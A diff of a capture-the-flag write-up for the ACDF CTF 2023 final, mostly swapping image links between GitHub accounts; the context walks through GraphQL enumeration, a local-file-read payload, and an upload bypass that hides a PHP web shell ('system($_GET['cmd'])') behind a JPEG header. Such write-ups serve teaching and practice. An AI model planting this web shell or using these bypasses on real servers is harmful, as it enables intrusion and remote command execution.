@@ -14,30 +14,30 @@ https://hackmd.io/@RedTeamTG/acdfctf-final-2023
   
 - Grandline:
 
-<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/7.png" alt="img"></p>
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/7.png" alt="img"></p>
 
 This is an injection of graphql code, we even have a console which displays the results of the commands
 
 First of all, we are going to do the enumeration in order to see the functions and methods that are accessible. the following payload does the trick:
 
-<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/1.png" alt="img"></p>
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/1.png" alt="img"></p>
 
 we can notice that we have an interesting function called "flags" with the id, author, content and flag parameters.
 Let's try to query the id 1 of the flags function. here I specified the content and flag parameters.
 
-<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/2.png" alt="img"></p>
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/2.png" alt="img"></p>
 
 
 We notice that we have a return with the following content: "Why don't you dig harder"; the rest becomes logical we must identify the id which contains our flag. I first tried id 2 then id 3 which turned out to be the right one.
 
-<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/3.png" alt="img"></p>
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/3.png" alt="img"></p>
 
 Flag: acdfCTF{L3t_try_s0m3_Graph_0ut}
 
 
 - Image Lookup:
 
-<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/6.png" alt="img"></p>
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/6.png" alt="img"></p>
 
 This one is an easy lfi web challenge you just had to call the flag file with the following payload: "file:///flag.txt" , paying attention to encoding the characters /
 here is the query that I used to get the flag
@@ -49,7 +49,7 @@ Unfortunately the flag is no longer accessible on the server
 
 - Konoha:
 
-<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/4.png" alt="img"></p>
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/4.png" alt="img"></p>
 
 we have a source.php file. let's try to analyze it:
 ```python
@@ -100,13 +100,13 @@ The flag has unfortunately been removed from the server. I unfortunately didn't 
 
 - DPO Agba:
 
-<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/8.png" alt="img"></p>
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/8.png" alt="img"></p>
 
 the images from the web server are no longer accessible I'm going to do a writeup for you a little blindly lol, I would have liked to add more illustrations but hey it doesn't matter, let's go.
 
 The first step was to decode the obfuscated data in the source code. Cyberchef made it possible:
 
-<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/9.png" alt="img"></p>
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/9.png" alt="img"></p>
 
 when we analyze the result we can see that we have a way to upload images to the server using the upload.php file. What better way to have a shell!.
 Unfortunately when we tried to upload our image, we have restrictions that prevent us from uploading php files or anything other than images and in addition the file size must not exceed more than 35 bytes. Here we need to bypass these restrictions.
@@ -117,7 +117,7 @@ our initial payload: ```<?php system($_GET['cmd']); ?>```
 
 but to make that work we have to change the header to that of a .jpeg file. Checking it up online I found this “FF D8 FF EE”. So, let’s change the header to that; hexed.it does the trick.
 
-<p align="center"> <img src="https://github.com/Assa228/Final_ACDF_CTF_2023/blob/main/images/10.png" alt="img"></p>
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/10.png" alt="img"></p>
 
 our final image content should look like this: ```ÿØÿî<?php system($_GET['cmd']); ?>```
 
@@ -130,10 +130,9 @@ Here the payload that I used to get the shell:<br>
 
 - What's going on :
     
-![](https://hackmd.io/_uploads/SkDg9H3z6.png)
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/11.png" alt="img"></p>
 
 This is an RSA challenge, with a bit of guessing. we have an encoded file which contains the flag. The encoded file was provided with a private key to unlock the flag. The difficulty here is that the key is password protected. He made several attempts before coming across the password which was "password". We used cyberchief to decipher the flag as you see below.
     
-![](https://hackmd.io/_uploads/SJH2YB3fT.png)
-
+<p align="center"> <img src="https://github.com/cyberpoul/Final_ACDF_CTF_2023/blob/main/images/12.png" alt="img"></p>
 </details>
